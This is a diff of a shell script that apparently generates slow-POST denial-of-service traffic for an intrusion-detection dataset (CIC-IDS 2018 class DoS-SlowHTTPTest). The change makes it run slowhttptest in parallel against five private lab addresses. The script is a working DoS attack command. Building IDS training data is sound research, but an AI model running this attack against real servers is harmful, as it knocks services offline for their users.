@@ -10,16 +10,15 @@
 # (server waiting for complete body before responding).
 #
 # Maps to CIC-IDS 2018 class DoS-SlowHTTPTest (class 7).
-TARGET=${1:-http://172.20.0.10/}
-CONNS=${2:-200}
-DURATION=${3:-120}
+# All 5 nodes targeted in parallel.
+CONNS=${1:-200}
+DURATION=${2:-120}
 
-echo "[attack] Slow POST body -> $TARGET  $CONNS connections  ${DURATION}s"
+VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"
 
-# -B: slow body mode (POST body dribbled byte-by-byte)
-# -c: concurrent connections
-# -l: test duration in seconds
-# -i: interval between body data chunks (seconds)
-# -s: Content-Length declared in the POST header
-# -r: connection rate per second
-slowhttptest -B -c "$CONNS" -l "$DURATION" -i 10 -s 8192 -r 50 -u "$TARGET"
+echo "[attack] Slow POST body -> all nodes  $CONNS connections each  ${DURATION}s"
+for ip in $VICTIMS; do
+    # -B: slow body mode, -i: chunk interval, -s: Content-Length, -r: conn rate
+    slowhttptest -B -c "$CONNS" -l "$DURATION" -i 10 -s 8192 -r 50 -u "http://$ip/" &
+done
+wait
